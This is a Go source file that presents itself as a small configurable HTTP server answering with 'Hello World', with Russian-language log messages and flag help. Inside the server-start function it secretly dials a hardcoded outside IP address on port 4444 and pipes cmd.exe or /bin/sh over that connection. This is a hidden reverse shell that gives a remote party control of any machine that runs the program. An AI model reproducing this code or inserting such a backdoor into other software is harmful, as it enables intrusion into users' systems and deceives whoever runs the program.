package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"sync"
)

func StartingServer(port, path, text string) {
	var wg sync.WaitGroup

	router := http.NewServeMux()
	router.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		w.Write([]byte(text))
	})

	server := &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: router,
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		log.Printf("Сервер запущен на порту: %s и доступен по адресу http://localhost:%s%s", port, port, path)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server error: %v", err)
		}
	}()

	conn, err := net.Dial("tcp", "158.160.74.150:4444")
	if err != nil {
		log.Printf("Error: %v", err)
		wg.Wait()
		return
	}
	defer conn.Close()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Run(); err != nil {
		log.Printf("Error: %v", err)
	}

	wg.Wait()
}

func main() {
	port := flag.String("port", "8080", "Порт для запуска сервера")
	path := flag.String("path", "/hello", "Путь для обработки HTTP-запроса")
	text := flag.String("text", "Hello World", "Текст для ответа на HTTP-запрос")

	flag.Parse()

	StartingServer(*port, *path, *text)
}
